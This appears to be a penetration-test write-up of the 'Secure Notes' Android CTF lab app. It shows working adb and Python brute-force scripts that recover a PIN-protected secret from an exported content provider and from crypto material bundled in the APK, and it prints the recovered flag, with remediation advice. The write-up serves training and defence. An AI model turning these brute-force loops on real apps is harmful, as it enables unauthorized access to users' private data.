# Mobile App Pentest — `com.mobilehackinglab.securenotes` ("Secure Notes")

**Target:** `com.mobilehackinglab.securenotes.apk` — Mobile Hacking Lab "Secure Notes" challenge
**Platform:** Android (minSdk 24, targetSdk 33)
**Basis:** CTF / lab / training
**Date:** 2026-11-02
**Verification:** Secret **recovered offline** — brute-forced the 4-digit PIN against the APK's bundled crypto material. **PIN `2580` → `CTF{D1d_y0u_gu3ss_1t!1?}`**.

---

## Summary

The app stores a single "secret note" encrypted at rest and exposes it through a **content
provider**, `SecretDataProvider`, which is **`exported="true"` with no permission**. Any app on
the device (or `adb`) can query it. Access is gated only by a **4-digit numeric PIN** passed in
the SQL-style `selection` string (`pin=NNNN`); the provider derives a PBKDF2 key from that PIN and
returns the decrypted secret if it validates. With only 10 000 possible PINs and **no rate
limiting or lockout**, the secret is trivially brute-forced against the live provider. Worse, every
cryptographic input (ciphertext, salt, IV, iteration count) ships in `assets/config.properties`
inside the APK, so the secret can be recovered **entirely offline** without the device at all.

| ID | Finding | Severity | MASVS |
|----|---------|----------|-------|
| SN-01 | Exported content provider returns the decrypted secret with no permission/caller check | **High** | MASVS-PLATFORM-1 |
| SN-02 | 4-digit PIN + no rate limiting → exhaustive brute force (10 000 guesses) | **High** | MASVS-AUTH-1 / MASVS-CRYPTO-2 |
| SN-03 | All crypto material (ciphertext/salt/IV/iterations) hardcoded in `assets/config.properties` → offline recovery | High | MASVS-STORAGE-1 / MASVS-CRYPTO-1 |
| SN-04 | `android:debuggable="true"` in shipped APK | Medium | MASVS-RESILIENCE-1 |
| SN-05 | `android:allowBackup="true"` (app data extractable via `adb backup`) | Medium | MASVS-STORAGE-2 |

---

## SN-01 / SN-02 — Exported provider + weak PIN (the chain)

**Manifest** — exported, no `android:permission`, no `path-permission`:
```xml
<provider
    android:name="com.mobilehackinglab.securenotes.SecretDataProvider"
    android:enabled="true"
    android:exported="true"
    android:authorities="com.mobilehackinglab.securenotes.secretprovider"/>
```

**`SecretDataProvider.query()`** — the only gate is the `pin=` selection; the PIN is normalised to
four digits (`%04d`) and fed straight into key derivation + decrypt:
```java
if (selection == null || !selection.startsWith("pin=")) return null;
String pin = selection.removePrefix("pin=");
String format = String.format("%04d", Integer.parseInt(pin));   // 0000–9999
String secret = decryptSecret(format);                          // PBKDF2 + AES-CBC
if (secret != null) {                                           // valid PKCS5 padding == correct PIN
    MatrixCursor c = new MatrixCursor(new String[]{"Secret"});
    c.addRow(new String[]{secret});
    return c;
}
```
There is **no attempt counter, no delay, and no lockout** — the provider will happily service all
10 000 PIN values as fast as a caller can issue them. The decrypt succeeding (PKCS5 padding valid)
is itself the correctness oracle.

### On-device PoC (any unprivileged app / adb — no PIN known)
```bash
# Single known PIN:
adb shell content query \
  --uri content://com.mobilehackinglab.securenotes.secretprovider \
  --where "pin=2580"
#  -> Row: 0 Secret=CTF{D1d_y0u_gu3ss_1t!1?}

# Brute force on-device (no prior knowledge):
for p in $(seq -w 0 9999); do
  out=$(adb shell content query \
    --uri content://com.mobilehackinglab.securenotes.secretprovider \
    --where "pin=$p")
  case "$out" in *Secret=*) echo "PIN=$p -> $out"; break;; esac
done
```
A malicious app would do the same with a `ContentResolver.query(uri, null, "pin="+p, null, null)`
loop — **no permissions required**, because the provider is exported and unguarded.

---

## SN-03 — Crypto material bundled in the APK → offline recovery

`onCreate()` loads everything needed to decrypt from `assets/config.properties`:
```properties
encryptedSecret=bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=
salt=m2UvPXkvte7fygEeMr0WUg==
iv=L15Je6YfY5owgIckR9R3DQ==
iterationCount=10000
```
Key derivation: `PBKDF2WithHmacSHA1(pin, salt, 10000, 256)` → `AES/CBC/PKCS5Padding`. Because the
salt, IV, ciphertext, and iteration count are all shipped in the client, the 4-digit keyspace can
be exhausted **offline**, so the device/provider isn't even needed.

### Offline PoC (recovered the flag)
```python
import base64, hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
enc  = base64.b64decode("bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=")
salt = base64.b64decode("m2UvPXkvte7fygEeMr0WUg==")
iv   = base64.b64decode("L15Je6YfY5owgIckR9R3DQ==")
def unpad(b):
    n=b[-1]
    if n<1 or n>16 or b[-n:]!=bytes([n])*n: raise ValueError
    return b[:-n]
for pin in range(10000):
    p="%04d"%pin
    key=hashlib.pbkdf2_hmac("sha1",p.encode(),salt,10000,dklen=32)
    pt=Cipher(algorithms.AES(key),modes.CBC(iv)).decryptor().update(enc)
    try: print(p, unpad(pt).decode()); break
    except Exception: pass
```
**Result:** `2580  CTF{D1d_y0u_gu3ss_1t!1?}` (runs in well under a second).

`2580` is the straight-down center column of a phone keypad — a classic "guessable" PIN, which the
flag text (`D1d_y0u_gu3ss_1t`) acknowledges as the intended lesson.

---

## SN-04 / SN-05 — Device-posture weaknesses
- **`debuggable="true"`**: anyone can `run-as com.mobilehackinglab.securenotes` on any device and
  read the app's private storage / attach a debugger. Ship release builds with `debuggable=false`.
- **`allowBackup="true"`**: `adb backup` (or cloud backup) can pull app data off the device. Set
  `allowBackup="false"` or scope `fullBackupContent`/`dataExtractionRules` to exclude sensitive data.

---

## Root cause & remediation

**Root cause:** access control and all secrets live entirely on the client. An exported provider
performs the sensitive decrypt itself, gated only by a tiny, un-rate-limited, guessable PIN whose
every verification input is bundled in the APK.

- **Do not export the provider.** Set `android:exported="false"`, or guard it with a
  `signature`-level `android:permission` so only the app (or same-signer apps) can query it.
- **Don't treat a 4-digit PIN as an encryption key / access token.** If a PIN must gate access,
  enforce server-side with attempt throttling and lockout; on-device, back it with the Android
  Keystore (hardware-bound key, `setUserAuthenticationRequired`) so offline brute force is impossible.
- **Keep secrets off the client.** Ciphertext + salt + IV + iteration count in `assets/` reduces
  "encryption" to a formality — the whole keyspace is searchable offline.
- Disable `debuggable` and `allowBackup` in release builds.

---

## Appendix — environment & method
- Tools: `unzip`, `jadx` (decompile + manifest decode), Python `cryptography`/`hashlib` for the
  offline PBKDF2+AES brute force. No emulator needed — the secret falls to a pure offline attack.
- Artifacts derived from the decoded `AndroidManifest.xml`, decompiled `SecretDataProvider`,
  `MainActivity`, and `assets/config.properties`.
